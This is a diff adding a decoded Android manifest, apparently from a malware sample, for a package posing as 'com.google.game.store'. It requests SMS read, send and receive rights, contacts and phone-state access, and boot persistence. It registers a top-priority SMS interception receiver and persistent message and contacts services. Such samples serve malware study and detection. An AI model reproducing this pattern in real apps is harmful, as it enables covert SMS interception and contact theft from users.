@@ -1,0 +1,76 @@
+manifest
+- package: com.google.game.store
+- versionName: 1.0
+- versionCode: 1
+	uses-sdk
+	- minSdkVersion: 8
+	- targetSdkVersion: 8
+	uses-permission
+	- name: android.permission.WRITE_EXTERNAL_STORAGE
+	uses-permission
+	- name: android.permission.MOUNT_UNMOUNT_FILESYSTEMS
+	uses-permission
+	- name: android.permission.READ_SMS
+	uses-permission
+	- name: android.permission.RECEIVE_SMS
+	uses-permission
+	- name: android.permission.READ_PHONE_STATE
+	uses-permission
+	- name: com.android.launcher.permission.INSTALL_SHORTCUT
+	uses-permission
+	- name: android.permission.INTERNET
+	uses-permission
+	- name: android.permission.READ_CONTACTS
+	uses-permission
+	- name: android.permission.SEND_SMS
+	application
+	- icon: 2130837506
+	- theme: 2131230721
+	- label: 2131165184
+	- allowBackup: true
+		activity
+		- name: com.google.game.store.MainActivity
+		- theme: 16973839
+		- label: 2131165184
+			intent-filter
+				action
+				- name: android.intent.action.MAIN
+				category
+				- name: android.intent.category.LAUNCHER
+		activity
+		- name: com.google.game.store.site.BKMain
+		- theme: 16973830
+		- screenOrientation: 1
+		activity
+		- name: com.google.game.store.site.Factory
+		- theme: 16973839
+		receiver
+		- name: com.google.game.store.recevier.BootRecevier
+		- permission: android.permission.RECEIVE_BOOT_COMPLETED
+			intent-filter
+			- priority: 1000
+				action
+				- name: android.intent.action.BOOT_COMPLETED
+				category
+				- name: android.intent.category.HOME
+		receiver
+		- name: com.google.game.store.recevier.ActiveRecevier
+			intent-filter
+			- priority: 2147483647
+				action
+				- name: android.intent.action.USER_PRESENT
+		receiver
+		- name: com.google.game.store.recevier.MessageReceiver
+			intent-filter
+			- priority: 2147483647
+				action
+				- name: android.provider.Telephony.SMS_RECEIVED
+		service
+		- name: com.google.game.store.service.Notifications
+		- persistent: true
+		service
+		- name: com.google.game.store.service.MessageService
+		- persistent: true
+		service
+		- name: com.google.game.store.service.ContactsService
+		- persistent: true
